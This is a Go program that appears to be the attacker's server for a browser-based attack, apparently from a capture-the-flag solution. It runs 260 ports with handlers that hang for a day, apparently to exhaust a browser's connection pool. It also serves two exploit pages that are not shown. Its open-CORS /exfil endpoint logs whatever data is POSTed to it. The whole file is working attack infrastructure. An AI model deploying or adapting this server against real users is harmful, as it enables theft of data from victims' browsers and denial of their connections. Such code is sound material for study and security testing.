package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"sync"
	"time"
)

func readFile(filename string) ([]byte, error) {
	return ioutil.ReadFile(filename)
}

func hangHandler(port int) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(24 * time.Hour)

		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("Connection", "close")
		w.WriteHeader(http.StatusOK)
	}
}

func popHtmlHandler(port int) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		log.Printf("[%s] Request received: %s %s from %s", time.Now().Format("15:04:05"), r.Method, r.URL.Path, r.RemoteAddr)
		
		content, err := readFile("pop.html")
		if err != nil {
			log.Printf("Error reading pop.html: %v", err)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "text/html")
		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("Connection", "close")
		w.WriteHeader(http.StatusOK)
		w.Write(content)
	}
}

func grandparentHtmlHandler(port int) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		log.Printf("[%s] Request received: %s %s from %s", time.Now().Format("15:04:05"), r.Method, r.URL.Path, r.RemoteAddr)
		
		content, err := readFile("grandparent.html")
		if err != nil {
			log.Printf("Error reading grandparent.html: %v", err)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "text/html")
		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("Connection", "close")
		w.WriteHeader(http.StatusOK)
		w.Write(content)
	}
}

func exfilHandler(port int) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		log.Printf("[%s] Request received: %s %s from %s", time.Now().Format("15:04:05"), r.Method, r.URL.Path, r.RemoteAddr)
		
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST")
		w.Header().Set("Cache-Control", "no-store")

		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		if r.Method == "POST" {
			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				log.Printf("Error reading POST body: %v", err)
				w.WriteHeader(http.StatusBadRequest)
				return
			}
			defer r.Body.Close()
			
			fmt.Printf("[%s] EXFIL POST: %s\n", time.Now().Format("15:04:05"), string(body))
		}

		w.WriteHeader(http.StatusOK)
	}
}

func startServer(port int, wg *sync.WaitGroup) {
	defer wg.Done()

	mux := http.NewServeMux()
	mux.HandleFunc("/sleep", hangHandler(port))

	server := &http.Server{
		Addr:    fmt.Sprintf(":%d", port),
		Handler: mux,
	}

	server.SetKeepAlivesEnabled(false)

	if err := server.ListenAndServe(); err != nil {
		log.Printf("Server on port %d failed: %v\n", port, err)
	}
}

func main() {
	var wg sync.WaitGroup

	const (
		INT_SOCKETS  = 260 
		DEFAULT_PORT = 8000
	)

	for port := DEFAULT_PORT; port < DEFAULT_PORT+INT_SOCKETS; port++ {
		wg.Add(1)
		go startServer(port, &wg)
		time.Sleep(1 * time.Millisecond)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()

		mux := http.NewServeMux()
		mux.HandleFunc("/exfil", exfilHandler(80))
		mux.HandleFunc("/pop.html", popHtmlHandler(80))
		mux.HandleFunc("/grandparent.html", grandparentHtmlHandler(80))

		server := &http.Server{
			Addr:    ":80",
			Handler: mux,
		}
		server.SetKeepAlivesEnabled(false)

		log.Println("[*] HTTP server listening on port 80")
		err := server.ListenAndServe()
		if err != nil {
			log.Fatalf("HTTP server failed: %v", err)
		}
	}()

	fmt.Println("[*] Servers started: HTTP on 80\n[*] HTTP /sleep servers 8000-8259")

	wg.Wait()
}

